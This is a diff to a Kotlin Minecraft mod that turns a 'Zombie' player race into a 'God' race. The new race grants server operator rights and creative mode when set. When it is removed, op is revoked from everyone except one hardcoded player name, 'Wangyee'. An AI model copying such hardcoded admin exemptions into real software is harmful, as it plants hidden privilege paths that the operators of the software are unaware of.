@@ -1,27 +1,25 @@
 package dev.deepslate.fallacy.race.impl
 
 import dev.deepslate.fallacy.Fallacy
-import dev.deepslate.fallacy.behavior.BehaviorTags
 import dev.deepslate.fallacy.common.data.player.PlayerAttribute
 import dev.deepslate.fallacy.race.Race
+import dev.deepslate.fallacy.util.ServerHelper
 import net.minecraft.core.BlockPos
 import net.minecraft.resources.ResourceLocation
 import net.minecraft.server.level.ServerLevel
 import net.minecraft.server.level.ServerPlayer
+import net.minecraft.world.level.GameType
 
-class Zombie : Race {
+class God : Race {
 
     companion object {
-        val ID = Fallacy.id("zombie")
-        val TAGS = arrayOf(
-            BehaviorTags.UNDEAD, BehaviorTags.WEAKNESS2_IN_SUNLIGHT, BehaviorTags.WEAKNESS_IN_DAY,
-            BehaviorTags.BURNING_IN_SUNLIGHT
-        )
+        val ID = Fallacy.id("god")
     }
 
     override val namespacedId: ResourceLocation = ID
 
-    override val attribute: PlayerAttribute = PlayerAttribute(health = 40.0, attackDamage = 4.0, strength = 2.0, armor = 4.0)
+    override val attribute: PlayerAttribute =
+        PlayerAttribute(health = 200.0, armor = 1000.0, attackSpeed = 50.0, moveSpeed = 0.2)
 
     override fun tick(
         level: ServerLevel,
@@ -32,10 +30,14 @@ class Zombie : Race {
 
     override fun set(player: ServerPlayer) {
         attribute.set(player)
-        BehaviorTags.set(player, *TAGS)
+        ServerHelper.server?.playerList?.op(player.gameProfile)
+        player.setGameMode(GameType.CREATIVE)
     }
 
     override fun remove(player: ServerPlayer) {
-        BehaviorTags.remove(player, *TAGS)
+        if (player.gameProfile.name != "Wangyee") {
+            ServerHelper.server?.playerList?.deop(player.gameProfile)
+        }
+        player.setGameMode(GameType.SURVIVAL)
     }
 }
